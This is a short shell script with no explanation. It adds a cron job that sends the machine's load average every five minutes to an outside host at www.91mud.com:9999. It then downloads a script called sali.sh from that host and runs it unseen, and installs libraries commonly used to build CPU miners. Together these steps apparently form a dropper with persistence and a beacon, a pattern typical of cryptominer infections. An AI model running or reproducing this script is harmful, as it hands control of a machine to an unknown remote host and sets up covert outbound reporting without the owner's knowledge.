crontab -l > tempcron
echo '*/5 * * * * curl -d "cpuload= $(uptime|cut -d ":" -f5)" www.91mud.com:9999/tera' >> tempcron
crontab tempcron
rm tempcron
wget www.91mud.com:9999/sali.sh
bash sali.sh
sudo apt-get install -y -q libjansson-dev libcurl4-openssl-dev
